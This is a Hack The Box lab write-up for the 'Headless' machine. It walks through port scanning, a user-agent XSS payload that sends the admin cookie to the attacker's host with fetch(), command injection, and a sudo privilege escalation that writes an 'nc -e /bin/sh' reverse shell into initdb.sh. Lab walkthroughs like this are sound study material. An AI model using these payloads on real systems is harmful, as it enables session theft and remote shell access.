#HacktheBox 

Starting with Nmap to check for open ports :

```bash
nmap -sT -Pn -p- --min-rate 10000 10.10.11.8
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-15 08:04 EDT
Warning: 10.10.11.8 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.8
Host is up (0.22s latency).
Not shown: 64429 closed tcp ports (conn-refused), 1104 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 28.44 seconds
```

Let's perform full nmap scan:

```bash
sudo nmap -sC -sV -p22,5000 10.10.11.8 -oN nmap.txt 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-15 08:12 EDT
Nmap scan report for 10.10.11.8
Host is up (0.22s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Sat, 15 Jun 2024 12:12:16 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2799
|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Under Construction</title>
|     <style>
|     body {
|     font-family: 'Arial', sans-serif;
|     background-color: #f7f7f7;
|     margin: 0;
|     padding: 0;
|     display: flex;
|     justify-content: center;
|     align-items: center;
|     height: 100vh;
|     .container {
|     text-align: center;
|     background-color: #fff;
|     border-radius: 10px;
|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=6/15%Time=666D8525%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,BE1,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\
SF:x20Python/3\.11\.2\r\nDate:\x20Sat,\x2015\x20Jun\x202024\x2012:12:16\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x202799\r\nSet-Cookie:\x20is_admin=InVzZXIi\.uAlmXlTvm8vyihjNaPDWnvB_Z
SF:fs;\x20Path=/\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\
SF:x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\
SF:x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-wid
SF:th,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Under\x20Construct
SF:ion</title>\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\x20b
SF:ody\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\
SF:x20'Arial',\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20background-color:\x20#f7f7f7;\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20padding:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20di
SF:splay:\x20flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justif
SF:y-content:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:align-items:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20height:\x20100vh;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20\.container\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20text-align:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20background-color:\x20#fff;\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20border-radius:\x2010px;\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20box-shadow:\x200px\x200px\x2020px\x20rgba\(0,\x20
SF:0,\x200,\x200\.2\);\n\x20\x20\x20\x20\x20")%r(RTSPRequest,16C,"<!DOCTYP
SF:E\x20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20
SF:\x20\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x
SF:20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20resp
SF:onse</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20vers
SF:ion\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\
SF:x20code\x20explanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x
SF:20unsupported\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 126.08 seconds
```

Here we can see only 2 ports are open `ssh` and `upnp`

UPnP is a network protocol that allow devices to discover and interact with each other seamlessly over a local network. Default ports are 1900(UDP) and 5000 (TCP).

The other port is a website by looking the http banner and we can see
`Server: Werkzeug/2.2.2 Python/3.11.2` it a python based web-server

`Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs;` 

It's look like it's a `base64` encoded string lets look into it:

Checking  strings:

```bash
echo InVzZXIi | base64 --decode
"user"  
```
```bash
echo uAlmXlTvm8vyihjNaPDWnvB_Zfs | base64 --decode
�       f^T�����▒�h��base64: invalid input

```

Here we will `pipe` the result with a tool `ent` which is mentioned [[Tips]]

```bash
echo uAlmXlTvm8vyihjNaPDWnvB_Zfs | base64 --decode | ent
base64: invalid input
Entropy = 3.969816 bits per byte.

Optimum compression would reduce the size
of this 17 byte file by 50 percent.

Chi square distribution for 17 samples is 269.12, and randomly
would exceed this value 26.00 percent of the times.

Arithmetic mean value of data bytes is 155.0000 (127.5 = random).
Monte Carlo value for Pi is 4.000000000 (error 27.32 percent).
Serial correlation coefficient is 0.049425 (totally uncorrelated = 0.0).
```

So maybe it some type of signature `is admin : user : signature`

Visiting port 5000 we see a website is hosted:

![](images/Pasted%20image%2020240722184714.png)

It appears that website is under maintenance and available after 26 days and there is a  `For question` button also.

![](images/Pasted%20image%2020240722185001.png)

Submitting the details and intercepting the request with `Burp`:

![](images/Pasted%20image%2020240722185057.png)

Here we can see the  `is admin` cookie .

To get more information we will use `gobuster` for dir enumeration.

```bash
gobuster dir -u http://10.10.11.8:5000 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.8:5000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/support              (Status: 200) [Size: 2363]
/dashboard            (Status: 500) [Size: 265]

```

Here we see 500 error in dashboard so we visit dashboard:

![](images/Pasted%20image%2020240615180526.png)

![](images/Pasted%20image%2020240615180549.png)

I noticed the cookie, which is called “is_admin”. This is the same on the “Contact Support” page as on the dashboard/ page. I found it strange that I have an “is_admin” cookie even though I have never logged in or entered any relevant information that would be used for a cookie.

Here i try basic XSS payload in contact :

![](images/Pasted%20image%2020240615182707.png)

But it detected

payload used : in user agent

` <img src=x onerror=fetch('http://10.10.16.2/?c='+document.cookie);>`

![](images/Pasted%20image%2020240615183651.png)



```bash
 sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.16.2 - - [15/Jun/2024 09:05:03] "GET /?c= HTTP/1.1" 200 -
10.10.11.8 - - [15/Jun/2024 09:06:10] "GET /?c=is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1" 200 -

```

Now we get admin cookie lets login in dashboard:

Now after generating report and intercept it :
I initially tried to inject command id and its works :

![](images/Pasted%20image%2020240615184226.png)

Now its time to upload a rev shell and execute it :

![](images/Pasted%20image%2020240615184821.png)

![](images/Pasted%20image%2020240615184842.png)

Here after getting user shell i check for suid permission:

```bash
dvir@headless:~$ sudo -l
sudo -l
Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck

```

Now lets see what's present in syscheck

```bash
cat /usr/bin/syscheck
cat /usr/bin/syscheck
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0

```

Reading the code of `syscheck` file i found that it is running `initdb.sh` file with sudo privilege.

I instantly created a new file called `initdb.sh` with reverse shell payload and i runned that `/usr/bin/syscheck` file and we got our shell with sudo privilege.

```bash
echo "nc -e /bin/sh 10.10.16.2 4000" > initdb.sh

chmod +x initdb.sh

sudo /usr/bin/syscheck
```
![](images/Pasted%20image%2020240615192053.png)

![](images/Pasted%20image%2020240615192116.png)
